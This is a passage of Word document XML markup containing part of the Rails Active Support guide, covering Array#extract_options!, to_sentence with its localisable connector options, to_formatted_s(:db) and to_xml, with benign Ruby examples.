          <w:p w14:paraId="5F893301" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  return</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>cache_configured?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D76864E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  options = actions.extract_options!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="370B291E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42352204" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F7483B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method receives an arbitrary number of action names, and an optional hash of options as last argument. With the call to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>extract_options!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> you obtain the options hash and remove it from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>actions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in a simple and explicit way.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33EE2D45" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/array/extract_options.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534B7A9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>10.4 Conversions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11ABF557" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">10.4.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_sentence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CEFBA57" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_sentence</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> turns an array into a string containing a sentence that enumerates its items:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4A334920" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="63CC43C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w().to_sentence                # =&gt; ""</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E509DD5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(Earth).to_sentence           # =&gt; "Earth"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65C3AFDF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(Earth Wind).to_sentence      # =&gt; "Earth and Wind"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F3EE065" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(Earth Wind Fire).to_sentence # =&gt; "Earth, Wind, and Fire"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2C892093" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This method accepts three options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B379FA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="278"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:two_words_connector</w:t>
      </w:r>
      <w:r>
        <w:t>: What is used for arrays of length 2. Default is " and ".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375B25BE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="278"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:words_connector</w:t>
      </w:r>
      <w:r>
        <w:t>: What is used to join the elements of arrays with 3 or more elements, except for the last two. Default is ", ".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EC3AD29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="278"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:last_word_connector</w:t>
      </w:r>
      <w:r>
        <w:t>: What is used to join the last items of an array with 3 or more elements. Default is ", and ".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D6CE24" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The defaults for these options can be localised, their keys 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5"/>
        <w:gridCol w:w="4035"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6BBBF80F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12AF2987" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Option </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="64D8C9A0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">I18n key </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="72A75471" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="252837BC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>:two_words_connector</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12EEEA83" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>support.array.two_words_connector</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="6B0E1FB4" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="185F5D60" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>:words_connector</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D8DFC20" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>support.array.words_connector</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="4F8ACABD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17E3328E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>:last_word_connector</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0217364D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>support.array.last_word_connector</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1A90994B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Options </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:connector</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:skip_last_comma</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are deprecated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38559A8D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/array/conversions.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4716F7ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">10.4.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_formatted_s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57321DBB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_formatted_s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> acts like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> by default.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38AB7895" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the array contains items that respond to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, however, it may be passed the symbol </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:db</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as argument. That’s typically used with collections of ARs, though technically any object in Ruby 1.8 responds to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> indeed. Returned strings are:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5DBE0534" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="253DCA51" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[].to_formatted_s(:db)            # =&gt; "null"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E874544" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[user].to_formatted_s(:db)        # =&gt; "8456"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36791240" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>invoice.lines.to_formatted_s(:db) # =&gt; "23,567,556,12"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5DDA8191" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Integers in the example above are supposed to come from the respective calls to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A9842D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/array/conversions.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C40666C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">10.4.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_xml</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA6204B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_xml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a string containing an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> representation of its receiver:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6120"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="37E53D93" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="593195AA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Contributor.limit(2).order(:rank).to_xml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E479258" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AC60FE9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;?xml version="1.0" encoding="UTF-8"?&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B5D4499" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;contributors type="array"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="641D6B3C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;contributor&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57A7CBD7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;id type="integer"&gt;4356&lt;/id&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B43D849" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;name&gt;Jeremy Kemper&lt;/name&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54CD58E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;rank type="integer"&gt;1&lt;/rank&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64D8CE2A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;url-id&gt;jeremy-kemper&lt;/url-id&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C6A1432" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;/contributor&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C95B46E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;contributor&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5637B9F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;id type="integer"&gt;4404&lt;/id&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32E57EE3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;name&gt;David Heinemeier Hansson&lt;/name&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29419B9D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;rank type="integer"&gt;2&lt;/rank&gt;</w:t>
            </w:r>
          </w:p>
